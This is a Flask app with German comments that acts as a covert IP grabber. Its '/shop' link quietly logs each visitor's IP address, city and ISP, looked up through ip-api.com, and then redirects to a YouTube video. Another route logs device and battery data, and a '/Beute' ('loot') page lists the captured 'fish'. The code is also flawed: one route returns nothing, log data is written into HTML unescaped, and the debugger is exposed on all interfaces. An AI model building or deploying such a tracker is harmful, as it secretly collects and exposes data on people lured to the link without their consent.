from flask import Flask, render_template, redirect, request
import datetime
import requests

app = Flask(__name__)

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/shop")
def shop():
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    # Standort-Daten abfragen
    try:
        # Hinweis: Lokal (127.0.0.1) wird hier "Fehler" stehen, 
        # echte Daten kommen erst, wenn die Seite online ist!
        response = requests.get(f"http://ip-api.com/json/{user_ip}").json()
        stadt = response.get('city', 'Unbekannt')
        isp = response.get('isp', 'Unbekannt')
    except:
        stadt = "Fehler"
        isp = "Fehler"

    zeit = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # In die Datei schreiben
    with open("Besucher_logs.txt", "a") as f:
        f.write(f"[{zeit}] IP: {user_ip} | Ort: {stadt} | Anbieter: {isp}\n")

    
    return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
@app.route('/log_hardware', methods=['POST'])
def log_hardware():
    data = request.get_json()
    zeit = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    akku = data.get('akku')
    geraet = data.get('geraet')

    with open("Besucher_logs.txt", "a") as f:
        f.write(f"[{zeit}] HARDWARE -> Akku: {akku} | Gerät: {geraet}\n")
    
@app.route('/Beute')
def show_logs():
    try:
        with open("Besucher_logs.txt", "r") as f:
            inhalt = f.read()
        # Gibt den Inhalt der Textdatei einfach im Browser aus
        return f"<h1>Gefangene Fische:</h1><pre>{inhalt}</pre>"
    except:
        return "Noch keine Beute gemacht."
   





    return '', 204

if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0')